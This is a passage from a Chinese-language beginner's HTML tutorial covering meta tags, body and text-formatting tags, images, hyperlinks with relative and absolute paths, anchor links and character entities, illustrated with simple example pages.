<li><strong><code>refresh</code>。刷新</strong>，用于设置多长时间内网页自己刷新一次，或者用一段时间自动跳转到其他页面，第一种编写格式<code>&lt;meta http-equiv=“refresh” context=“30”/&gt;</code>表示隔30秒刷新一次，第二种编写格式<code>&lt;meta http-equiv=“refresh” context=“30；url=www.google.com”/&gt;</code>，表示30秒后页面自动跳转到<a href="http://www.google.com网站/">www.google.com网站</a></li>
<li><font color="#FF7F00"><strong>name：</strong></font>可选属性。</li>
<li>用于页面的关键字和描述，是写给搜索引擎看的；</li>
<li>与之对应的属性值为content，content中的内容主要是便于搜索引擎机器人查找信息和分类信息用的。</li>
<li>主要用于描述网页的内容，用于对搜索引擎的优化，必须重点掌握。正确地设置name属性，以便搜索引擎（比如google，baidu）的搜索机器人查找，分类，搜索引擎一般都会自动查找meta值来给网页分类。name的取值(content)如下：<br> 1. **<code>keywords</code>**。即关键字，用于说明网页所包含的关键字等信息，从而提高被搜索引擎搜索到的概率。编写格式为<code>&lt;meta name=&quot;keywords&quot; content =“关键字”/&gt;</code>，content属性的值为用户所设置的具体关键字。（一般可设置多个关键字，他们之间用英文半角的逗号分开，搜索引擎都限制关键字的数量，所以关键字内容要简洁精练）<br> 2. **<code>description</code>**。中文意思为”描述”，用于描述网页的主要内容、主题等，合理设置也可以提高被搜索引擎搜索到的概率。格式为<code>&lt;meta name=&quot;description&quot; content =“对页面的描述”/&gt;</code>，content属性值为用户所设置的页面具体描述的内容，最多容纳1024个字符，但搜索引擎一边只显示约前175个字符。<br> 3. **<code>author</code>**。作者，用于设置网站作者的名称，比较专业的网站经常用到。格式为<code>&lt;meta name=&quot;author&quot; content =“作者名称”/&gt;</code></li>
</ol>
</li>
</ol>
</li>
</ol>
<p>可参读：<font color="#00B2EE">《<a href="http://www.php.cn/code/443.html">HTML &lt;head&gt; 元素</a>》</font> 、<font color="#00B2EE">《<a href="https://www.cnblogs.com/tielemao/archive/2018/05/25/9086693.html">HTML-head头部浅析</a>》</font> </p>
<br>

<p>例1：打开该网页后每隔20秒刷新一次</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;refresh&quot;</span> content=<span class="string">&quot;20&quot;</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;这是个展示网页hhh&lt;/h1&gt;</span><br><span class="line">        &lt;h2&gt;希望你能够在这里学的开心&lt;/h2&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br>

<p>例2：打开该网页20秒后跳转到百度首页</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;refresh&quot;</span> content=<span class="string">&quot;2;url=http://www.baidu.com&quot;</span>&gt;</span><br><span class="line">    &lt;/head&gt;                  <span class="string">&#x27;注意这里的2后是分号“;” &#x27;</span></span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;跳转网页hhh&lt;/h1&gt;</span><br><span class="line">        &lt;h2&gt;希望你能够在这里学的开心&lt;/h2&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>


<br>

<hr size="2" color="#00B2EE" width="100%" noshade>

<ol start="3">
<li><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;base&gt;</code>：标签</strong></font> <br></li>
</ol>
<p>   <code>&lt;base&gt;</code> 标签为页面上的所有链接设置默认的地址或默认的目标（target）</p>
<br>

<ol start="4">
<li><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;link&gt;</code>：标签</strong></font> <br></li>
</ol>
<p>   <code>&lt;link&gt;</code> 标签定义文档与外部资源之间的关系。</p>
<br>

<ol start="5">
<li><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;style&gt;</code>：标签</strong></font> <br></li>
</ol>
<pre><code>`&lt;style&gt;` 标签用于为 HTML 文档定义样式信息。
</code></pre>
<br>

<ol start="6">
<li><font color="#00B2EE" face="Microsoft YaHei"><strong><code>&lt;script&gt;&lt;/script&gt;</code>：标签</strong></font> <br></li>
</ol>
<p>   <code>&lt;script&gt;</code> 标签用于定义客户端脚本，比如JavaScript。</p>
<br>

<p><font size="4" face="Microsoft YaHei"><strong>2. <code>&lt;body&gt;</code>标签和标题</strong></font></p>
<p>HTML 标题（Heading）是通过<code>&lt;h1&gt; - &lt;h6&gt;</code>标签来定义的。</p>
<p><code>body</code>用法如下：</p>
<table>
<thead>
<tr>
<th align="left">用法</th>
<th align="left">作用</th>
<th align="left">可选属性&#x2F;是否赞成使用该属性</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>&lt;body&gt;内容&lt;/body&gt;</code></td>
<td align="left">定义文档的主体</td>
<td align="left">alink：规定文档中活动链接（active link）的的颜色<br>&amp;emsp;&amp;emsp;&amp;emsp;不赞成使用。请使用样式取代它。<br>background URL：规定文档的背景图。<br>&amp;emsp;&amp;emsp;&amp;emsp;不赞成使用。请使用样式取代它。<br>bgcolor：规定文档的背景颜色<br>&amp;emsp;&amp;emsp;&amp;emsp;不赞成使用。请使用样式取代它。<br>link：规定文档中未访问链接的默认颜色<br>&amp;emsp;&amp;emsp;&amp;emsp;不赞成使用。请使用样式取代它。<br>text：规定文档中所有文本的颜色<br>&amp;emsp;&amp;emsp;&amp;emsp;不赞成使用。请使用样式取代它。<br>vlink：规定文档中已被访问链接的颜色<br>&amp;emsp;&amp;emsp;&amp;emsp;不赞成使用。请使用样式取代它。</td>
</tr>
</tbody></table>
<p><strong><code>&lt;body&gt;</code>的常用属性</strong></p>
<p>bgColor：网页背景色。如：<code>&lt;body  bgColor = “red”&gt;</code></p>
<p>background：网页背景图片地址。如：<code>&lt;body  background = “images/01.jpg”&gt;</code></p>
<br>

<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;demook.hhh&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body background=<span class="string">&quot;https://i.loli.net/2019/03/08/5c82461ac1593.png&quot;</span>&gt;</span><br><span class="line">        &lt;h1&gt;Nice优秀啊....&lt;/h1&gt;</span><br><span class="line">       &lt;h2&gt;是的呢 ヾ(๑╹◡╹)ﾉ<span class="string">&quot; &lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img data-src="https://i.loli.net/2019/03/08/5c8246bcd4f93.png" alt="5.png"></p>
<br>

<br>

<p><font size="4" face="Microsoft YaHei"><strong>3. 文本修饰标签</strong></font></p>
<table>
<thead>
<tr>
<th align="left">用法</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong><code>&lt;b&gt;&lt;/b&gt;</code></strong></td>
<td align="left">加粗字体。如：<code>&lt;b&gt;HTML文件&lt;/b&gt;</code> ----&gt; <b>HTML文件</b></td>
</tr>
<tr>
<td align="left"><strong><code>&lt;i&gt;&lt;/i&gt;</code></strong></td>
<td align="left">斜体italic。如：<code>&lt;i&gt;HTML文本&lt;/i&gt;</code>----&gt; <i>HTML文本</i></td>
</tr>
<tr>
<td align="left"><strong><code>&lt;u&gt;&lt;/u&gt;</code></strong></td>
<td align="left">下划线underline。如：<code>&lt;u&gt;HTML文本&lt;/u&gt;</code>----&gt; <u>HTML文本</u></td>
</tr>
<tr>
<td align="left"><strong><code>&lt;s&gt;&lt;/s&gt;</code></strong></td>
<td align="left">删除线strike。如：<code>&lt;s&gt;删除线&lt;/s&gt;</code>----&gt; <s>删除线</s></td>
</tr>
<tr>
<td align="left"><strong><code>&lt;sup&gt;&lt;/sup&gt;</code></strong></td>
<td align="left">上标，如：<code>3&lt;sup&gt;x&lt;/sup&gt;</code> ----&gt; 3<sup>x</sup></td>
</tr>
<tr>
<td align="left"><strong><code>&lt;sub&gt;&lt;/sub&gt;</code></strong></td>
<td align="left">下标，如：<code>6&lt;sub&gt;5&lt;/sub&gt;</code> ----&gt; 6<sub>5</sub></td>
</tr>
<tr>
<td align="left"><strong><code>&lt;font&gt;&lt;/font&gt;</code></strong></td>
<td align="left">字体标记，如：<code>&lt;font size=&quot;4&quot; color=&quot;red&quot; face=&quot;Comic sans MS&quot;&gt;Demo&lt;/font&gt;</code><font size="4" color="red" face="Comic sans MS">Demo</font></td>
</tr>
<tr>
<td align="left"><strong><code>size</code></strong></td>
<td align="left"><code>&lt;font&gt;&lt;font&gt;</code>的属性。文本大小，取值1-7（1小，7大）</td>
</tr>
<tr>
<td align="left"><strong><code>color</code></strong></td>
<td align="left"><code>&lt;font&gt;&lt;font&gt;</code>的属性。颜色值</td>
</tr>
<tr>
<td align="left"><strong><code>face</code></strong></td>
<td align="left"><code>&lt;font&gt;&lt;font&gt;</code>的属性。字体，楷体、黑体、宋体</td>
</tr>
</tbody></table>
<br>

<br>

<p><font size="4" face="Microsoft YaHei"><strong>4. <code>&lt;p&gt;&lt;/p&gt;</code>表示一个段落</strong></font></p>
<p>属性及取值如下：</p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">值</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">align</td>
<td align="left">left<br>right<br>center<br>justify</td>
<td align="left">HTML5不支持。 HTML 4.01已废弃。 <br>不赞成使用。请使用样式取代它。 规定段落中文</td>
</tr>
</tbody></table>
<br>

<br>

<p><font size="4" face="Microsoft YaHei"><strong>5. <code>&lt;br&gt;</code> 标签</strong></font></p>
<p><code>&lt;br&gt;</code> 标签插入一个简单的换行符。<code>&lt;br&gt;</code> 标签是一个空标签，意味着它没有结束</p>
<p><strong>提示：</strong>在<font color="#FF7F00"><strong>写地址信息或者写诗词时 <code>&lt;br&gt;</code> 标签非常有用</strong></font>。</p>
<p><strong>注释：</strong> 请<font color="#FF7F00"><strong>使用 <code>&lt;br&gt;</code> 标签来输入空行，而不是分割段落</strong></font>。</p>
<p>在 HTML 中，<code>&lt;br&gt;</code> 标签没有结束标签。</p>
<p>在 XHTML 中，<code>&lt;br&gt;</code> 标签必须被正确地关闭，比如这样：<code>&lt;br /&gt;</code> 。</p>
<br>

<br>

<p><font size="4" face="Microsoft YaHei"><strong>6. <code>&lt;hr&gt;</code> 标签</strong></font></p>
<p><img data-src="https://i.loli.net/2019/03/08/5c82523cb9d72.png" alt="6.png"></p>
<br>

<br>

<p><font size="4" face="Microsoft YaHei"><strong>7. <code>&lt;pre&gt;&lt;/pre&gt;</code> <code>&lt;code&gt;&lt;/code&gt;</code></strong></font></p>
<p><strong><code>&lt;pre&gt;</code>预排版标记</strong></p>
<p>功能：将保留所有的空白字符(空格、换行符)，换句话说：就是原封不动输出。<br>可参读：<font color="#00B2EE">《<a href="https://www.jianshu.com/p/6abc36c28e45">html &lt;.code&gt;&amp;&lt;.pre&gt;</a>》</font> </p>
<br>

<br>

<p><font size="4" face="Microsoft YaHei"><strong>8. <code>&lt;strong&gt;</code>和 <code>&lt;em&gt;</code></strong></font></p>
<ul>
<li><p>有了段落又有了标题，现在如果想在一段话中特别强调某几个文字，这时候就可以用到<code>&lt;em&gt;</code>或<code>&lt;strong&gt;</code>标签。</p>
</li>
<li><p>但两者在强调的语气上有区别:<code>&lt;em&gt;</code> 表示强调，<code>&lt;strong&gt; </code>表示更强烈的强调。并且在浏览器中<code>&lt;em&gt;</code> 默认用斜体表示，<code>&lt;strong&gt;</code> 用粗体表示。两个标签相比，目前国内前端程序员更喜欢使用<code>&lt;strong&gt;</code>表示强调。</p>
</li>
<li><p><font color="#FF7F00"><strong><code>&lt;em&gt;</code>的内容在浏览中显示为斜体，<code>&lt;strong&gt;</code>显示为加粗</strong></font>。如果不喜欢这种样式，没有关系，以后可以使用css样式去改变它。</p>
</li>
</ul>
<br>

<br>

<p><font size="4" face="Microsoft YaHei"><strong>9. <code>&lt;span&gt;&lt;/span&gt;</code>&gt;</strong></font></p>
<ul>
<li><p><code>&lt;span&gt;</code> 标签被用来组合文档中的行内元素。span 没有固定的格式表现。当对它应用样式时，它才会产生视觉上的变化。如果不对 <code>&lt;span&gt;</code> 应用样式，那么 <code>&lt;span&gt;</code> 元素中的文本与其他文本不会任何视觉上的差异。</p>
</li>
<li><p><code>&lt;span&gt;</code> 标签提供了一种将文本的一部分或者文档的一部分独立出来的方式。</p>
</li>
<li><p>被 <code>&lt;span&gt;</code> 元素包含的文本，您可以使用 CSS 对它定义样式，或者使用 JavaScript 对它进行操作。</p>
</li>
</ul>
<br>

<br>


<h4 id="2-3-常用标签-链接和图像"><a href="#2-3-常用标签-链接和图像" class="headerlink" title="2.3 常用标签-链接和图像"></a><font color="#3CB371" face="Comic sans MS">2.3 常用标签-链接和图像</font></h4><h5 id="一-image图像"><a href="#一-image图像" class="headerlink" title="一. image图像"></a><font color="#00B2EE" face="Microsoft YaHei">一. image图像</font></h5><p><strong>注：</strong>这是一个单边标签</p>
<p><font color="#00B2EE" face="Microsoft YaHei"></font></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;img&gt;</code></strong> 单边标签，它只包含属性，并且没有闭合标签。<ul>
<li><input checked="" disabled="" type="checkbox"> <strong>必须属性</strong> ↓↓<ul>
<li><input checked="" disabled="" type="checkbox"> **<code>src</code>**：地址。src 指 “source”。源属性的值是图像的 URL 地址。语法：<code>&lt;img src=&quot;url&quot; alt=&quot;some_text&quot;&gt;</code></li>
<li><input checked="" disabled="" type="checkbox"> **<code>alt</code>**：图像替代文本，在浏览器无法载入图像时，浏览器将显示这个替代性的文本而不是图像。语法：<code>&lt;img src=&quot;../style/images/boat.gif&quot; alt=&quot;Big Boat&quot;&gt;</code></li>
</ul>
</li>
<li><input disabled="" type="checkbox"> <strong>可选属性</strong> ↓↓<ul>
<li><input disabled="" type="checkbox"> **<code>height</code>**：图像高度，默认单位为像素</li>
<li><input disabled="" type="checkbox"> <strong><code>width</code></strong> ：图像宽度，默认单位为像素</li>
<li><input disabled="" type="checkbox"> <strong><code>ismap</code></strong> ：为图像定义为服务器端图像映射</li>
</ul>
</li>
</ul>
</li>
</ul>
<br>

<p><strong>注：</strong>可以尝试输入其他属性看看效果，想要让图片居中，只能通过CSS。</p>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> &lt;p&gt;Life was like a box of chocolates, you never know what you<span class="string">&#x27;re gonna get.（生命就像一盒巧克力，结果往往出人意料。）---《阿甘正传》 </span></span><br><span class="line"><span class="string"> &lt;/p&gt;</span></span><br><span class="line"><span class="string"> &lt;img src=&quot;https://s2.ax1x.com/2019/03/04/kOxQJS.jpg&quot; width=&quot;200&quot;&gt;</span></span><br><span class="line"><span class="string"> &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/09/5c83893d59c1b.png" alt="11.png"></p>
<br>

<h5 id="二-超级链接"><a href="#二-超级链接" class="headerlink" title="二. 超级链接"></a><font color="#00B2EE" face="Microsoft YaHei">二. 超级链接</font></h5><p>请注意<font color="#FF7F00"><strong>超级链接和锚点链接是不一样滴……</strong></font></p>
<p>网站中随处可见超级链接的身影，打开百度新闻，任意点击一段话，就会打开新闻详情页，这全部都是超级链接</p>
<p><strong>语法格式：<code>&lt;a  属性 = “值”&gt;……&lt;/a&gt;</code></strong><br><strong>注：</strong><code>&lt;a&gt;</code>中不能再套<code>&lt;a&gt;</code>标记</p>
<br>

<p><font face="Microsoft YaHei" color="#20B2AA"><strong>1. 标签</strong></font> </p>
<ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;a&gt;&lt;/a&gt;</code></strong> 超级链接，中间是文本提示，常用属性:<ul>
<li><input checked="" disabled="" type="checkbox"> **<code>href</code>**：目标文件的地址URL（该URL可以是相对地址，也可以是绝对地址）</li>
<li><input checked="" disabled="" type="checkbox"> **<code>target</code>**：目标文件的显示窗口的方法：<ul>
<li><input disabled="" type="checkbox"> **<code>_blank</code>**：在新窗口中打开目标文件。</li>
<li><input disabled="" type="checkbox"> **<code>_self</code>**：在当前窗口中打开目标文件(默认打开)，相当于“替换”当前页面操作。</li>
<li><input disabled="" type="checkbox"> **<code>_parent</code>**：在父级窗口来打开目标文件。常用框架网页中</li>
<li><input disabled="" type="checkbox"> **<code>_top</code>**：在最顶级窗口来打开目标文件。常用框架网页中</li>
</ul>
</li>
</ul>
</li>
</ul>
<br>

<p><font face="Microsoft YaHei" color="#20B2AA"><strong>2. 绝对地址URL</strong></font> </p>
<p><strong>（1）远程的绝对地址</strong>：直接输入远程绝对路径</p>
<ol>
<li>访问远程的文件，总是以<code>&lt;a href=&quot;http://域名/主机名..&quot;&gt;提示文本&lt;/a&gt;</code><br>  如：<code>&lt;a href=&quot;https://Treecatee.github.io&quot; target=&quot;_blank&quot;&gt;Treecatee.github.io&lt;/a&gt;</code></li>
</ol>
<br>

<p>**（2）本地的绝对地址(很少使用)**：访问本地绝对的路径文件</p>
<ol>
<li>访问本地的绝对地址，是以<code>&lt;a href=&quot;http://file:///开头的绝对地址。&quot;&gt;file:///开头的绝对地址。&lt;/a&gt;</code><br>   如：<code>&lt;a href=&quot;file:///D:/image.html&quot; target=&quot;_blank&quot;&gt;</code></li>
</ol>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">     &lt;a href=<span class="string">&quot;https://treecatee.github.io&quot;</span>  target=<span class="string">&quot;_blank&quot;</span>&gt;远程绝对路径访问，哈哈哈😁&lt;/a&gt; </span><br><span class="line">      &lt;br&gt;&lt;br&gt;</span><br><span class="line">  &lt;a href=<span class="string">&quot;file:///D:/image.html&quot;</span> target=<span class="string">&quot;_blank&quot;</span>&gt;(。・∀・)ノ本地绝对路径访问，不要忘记“/ / /”&lt;/a&gt; </span><br><span class="line"> &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/09/5c8399a12d344.png" alt="12.png"></p>
<p><font face="Microsoft YaHei" color="#20B2AA"><strong>3. 相对地址URL</strong>（项目中路径一般是相对路径）</font> </p>
<p>（1）当前文件和目标文件是<strong>同级关系</strong>，链接地址直接写目标文件名。</p>
<p>（2）当前文件与<strong>目标文件所在的文件夹是同级关系</strong>，先找“文件夹名”，然后再找“文件名”。</p>
<p>（3）目标文件位于<strong>上一层目录中</strong>，往上找对应的目录，再找目录中的文件。</p>
<ol>
<li><strong>注意：</strong><br>1. **<code>./</code>**代表当前目录，默认使用<br>2. **<code>../</code>**代表上一级目录<br>3. **<code>../../</code>**代表上两级目录</li>
</ol>
<br>

<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">     &lt;a href=<span class="string">&quot;./tina.html&quot;</span>  target=<span class="string">&quot;_blank&quot;</span>&gt;同级目录下的本地相对路径链接，哈哈哈😁&lt;/a&gt; </span><br><span class="line">      &lt;br&gt;&lt;br&gt;</span><br><span class="line">   &lt;a href=<span class="string">&quot;../test/2.html&quot;</span> target=<span class="string">&quot;_blank&quot;</span>&gt;上级目录下的本地相对路径链接 (。・∀・)ノ&lt;/a&gt; </span><br><span class="line">   &lt;a href=<span class="string">&quot;../../dream/hap.mp3&quot;</span> target=<span class="string">&quot;_blank&quot;</span>&gt;上上级目录下的本地相对路径链接 ♪(´▽｀)&lt;/a&gt; </span><br><span class="line"> &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br>

<p><font face="Microsoft YaHei" color="#20B2AA"><strong>4. 特殊的链接</strong></font> </p>
<p>(1) 下载链接</p>
<ol>
<li><p>这些文件网页可以直接执行，如：.jpg、.png、.gif、.html、.htm、.txt等。</p>
</li>
<li><p>大部分文件，浏览器是不能直接执行的。如：.doc、.xls、.ppt、.rar、.psd……</p>
</li>
</ol>
<p>(2) 邮箱链接</p>
<p>(3) 普通空链接（#）如：<code>&lt;a href=&quot;#&quot;&gt;这是一个空链接&lt;/a&gt;</code></p>
<br>

<h5 id="三-锚点链接"><a href="#三-锚点链接" class="headerlink" title="三. 锚点链接"></a><font color="#00B2EE" face="Microsoft YaHei">三. 锚点链接</font></h5><p><strong><code>&lt;a id=&quot;锚点名称&quot;&gt;&lt;/a&gt;</code></strong> ：定义锚点，做个记号<br><strong><code>&lt;a href=&quot;[文件名]#锚点名称&quot;&gt;提示文本（必须有）&lt;/a&gt;</code></strong> ：记号，功能是跳到做记号的地方</p>
<p>分为当前页面跳转和跨页面跳转，页内跳转时不用文件名，跨页跳转时用。</p>
<br>

<blockquote>
<ol>
<li>锚点是什么？</li>
<li>为什么要用锚点？</li>
<li>锚点怎么用？</li>
</ol>
</blockquote>
<br>

<ol>
<li><strong>锚点是什么？</strong></li>
</ol>
<p>如我们在做一个很长的网页时，需要在页面内做一个导航，点击导航里的链接不是新开一个窗口或者跳转到其他网址，而是<font color="#FF7F00"><strong>跳转到当前页的某一个位置</strong></font>。那么所要跳转到的那个位置，我们就叫做<font color="#FF7F00"><strong>锚点</strong></font>，它是一种<font color="#FF7F00"><strong>在页面内部定位的方式</strong></font>。</p>
<ol start="2">
<li><strong>为什么要用锚点？</strong></li>
</ol>
<p>在写项目的时候，页面比较长，这时候需要设置锚点进行<font color="#FF7F00"><strong>快速定位</strong></font>到某个段落或某个位置。</p>
<ol start="3">
<li><strong>锚点怎么用？</strong></li>
</ol>
<p>分为当前页面跳转或者跨页面跳转：</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> <strong>定义锚点</strong>(作个记号)：用于定位的目的地。不管是当前当前页面内还是跨页跳转定义方法都一样；<ul>
<li><input disabled="" type="checkbox"> 定义方法：**<code>&lt;a id=&quot;锚点名称&quot;&gt;&lt;/a&gt;</code><strong>或</strong><code>&lt;h2 id=&quot;锚点名称&quot;&gt;&lt;/h2&gt;</code>**或…..</li>
<li><input checked="" disabled="" type="checkbox"> 锚点名称命名规则：<ul>
<li><input disabled="" type="checkbox"> 可以包含字母、数字、下划线，但<font color="#FF7F00"><strong>只能以字母开头</strong></font>。</li>
</ul>
</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> <strong>锚点</strong>（触发），也称为记号。<ul>
<li><input disabled="" type="checkbox"> 跳到当前页面定义方法：**<code>&lt;a  href=&quot;#锚点名称&quot;&gt;提示文本（必须有）&lt;/a&gt;</code>**</li>
<li><input disabled="" type="checkbox"> 跨页面跳转定义方法：**<code>&lt;a  href=&quot;目标页面路径#锚点名称&quot;&gt;提示文本（必须有）&lt;/a&gt;</code>**</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> **<code>id</code><strong>或</strong><code>name</code>**：定义锚点链接的名称。<ul>
<li><input disabled="" type="checkbox"> name是老方法，id是在name基础上发明的，后来才有的。</li>
<li><input disabled="" type="checkbox"> 使用name属性设置锚点很方便但<font color="#FF7F00"><strong>只能针对a标签来使用</strong></font>，具有一定的局限性。而对div等其他没有name属性的标签就不能起到作用了。</li>
<li><input disabled="" type="checkbox"> id兼容性很好。</li>
</ul>
</li>
</ul>
<br>

<p>示例（页内跳转）：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt; </span><br><span class="line">      &lt;a id=<span class="string">&quot;top&quot;</span>&gt;&lt;/a&gt;</span><br><span class="line">            &lt;!--设置锚点，索引功能--&gt;</span><br><span class="line">      &lt;a href=<span class="string">&quot;#a&quot;</span>&gt;点击我就会跳到第一段&lt;/a&gt;  </span><br><span class="line">      &lt;a href=<span class="string">&quot;#b&quot;</span>&gt;点击我就会跳到第二段&lt;/a&gt;</span><br><span class="line">      &lt;a href=<span class="string">&quot;#c&quot;</span>&gt;点击我就会跳到第三段&lt;/a&gt;</span><br><span class="line">                   .</span><br><span class="line">                   .</span><br><span class="line">                   .</span><br><span class="line">                   .</span><br><span class="line">              &lt;!--做记号--&gt;</span><br><span class="line">      &lt;h2 id=<span class="string">&quot;a&quot;</span>&gt;我是标题一&lt;/h2&gt;</span><br><span class="line">      &lt;h2 id=<span class="string">&quot;b&quot;</span>&gt;我是标题二&lt;/h2&gt;</span><br><span class="line">      &lt;h2 id=<span class="string">&quot;c&quot;</span>&gt;我是标题三&lt;/h2&gt;</span><br><span class="line">  　　</span><br><span class="line">      &lt;a href=<span class="string">&quot;#top&quot;</span>&gt;返回新闻顶部&lt;/a&gt;</span><br><span class="line">　　</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;                 </span><br></pre></td></tr></table></figure>

<br>

<p>示例（跨内跳转）：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt; </span><br><span class="line">                &lt;!--设置锚点，索引功能,然后在目的页面做好记号--&gt;</span><br><span class="line">       &lt;a href=<span class="string">&quot;https://treecatee.github.io#a&quot;</span>&gt;点击我就会跳到第一段&lt;/a&gt;  </span><br><span class="line">       &lt;a href=<span class="string">&quot;https://directoree.top#b&quot;</span>&gt;点击我就会跳到第二段&lt;/a&gt;</span><br><span class="line">       &lt;a href=<span class="string">&quot;https://taobao.com#c&quot;</span>&gt;点击我就会跳到第三段&lt;/a&gt;　　</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;                 </span><br></pre></td></tr></table></figure>


<br>

<br>


<h4 id="2-4-HTML字符实体"><a href="#2-4-HTML字符实体" class="headerlink" title="2.4 HTML字符实体"></a><font color="#3CB371" face="Comic sans MS">2.4 HTML字符实体</font></h4><br>

<p><font face="Microsoft YaHei"><strong>HTML 中的</strong><font color="#FF7F00"><strong>预留字符</strong></font><strong>必须被替换为</strong><font color="#FF7F00"><strong>字符实体</strong></font>。</font></p>
<br>

<p><font face="Microsoft YaHei"><strong>1. HTML 实体</strong></font></p>
<ol>
<li><p>在 HTML 中，某些字符是预留的。</p>
</li>
<li><p>在 HTML 中不能使用小于号（&lt;）和大于号（&gt;），这是因为浏览器会误认为它们是标签。</p>
</li>
<li><p>如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体（character entities）。</p>
</li>
<li><p><strong>注：</strong><font color="#FF7F00"><strong>记得加上半角分号<code>;</code>符号啊，不然识别不出来</strong></font></p>
</li>
</ol>
<br>

<blockquote>
<p>如需显示小于号，我们必须这样写：<code>&amp;lt;</code> 或 <code>&amp;#60;</code><br><strong>提示：</strong>使用实体名而不是数字的好处是，名称易于记忆。不过坏处是，浏览器也许并不支持所有实体名称（对实体数字的支持却很好）。</p>
</blockquote>
<br>

<p><font face="Microsoft YaHei"><strong>2. 不间断空格（non-breaking space）</strong></font></p>
<ul>
<li><p>HTML 中的常用字符实体是不间断空格(<code>&amp;nbsp;</code>)。</p>
</li>
